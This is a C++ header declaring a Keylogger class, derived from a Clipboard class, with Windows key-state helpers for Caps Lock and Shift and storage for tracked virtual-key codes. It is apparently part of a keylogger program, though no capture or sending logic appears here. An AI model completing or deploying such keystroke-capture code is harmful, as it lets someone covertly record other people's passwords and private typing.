#pragma once

#include <Windows.h>

#include "Clipboard.h"

class Keylogger: public Clipboard {
public:
	inline bool IsCapslockToggle() {
		return GetKeyState(VK_CAPITAL) & 1;
	}

	inline bool IsShiftDown() {
		return GetAsyncKeyState(VK_LSHIFT) < 0 || GetAsyncKeyState(VK_RSHIFT) < 0;
	}

	void UpdateVKCAll();

private:
	static std::vector<std::string> vkCodesAll;
	static std::vector<bool> vkCodesAllState;
};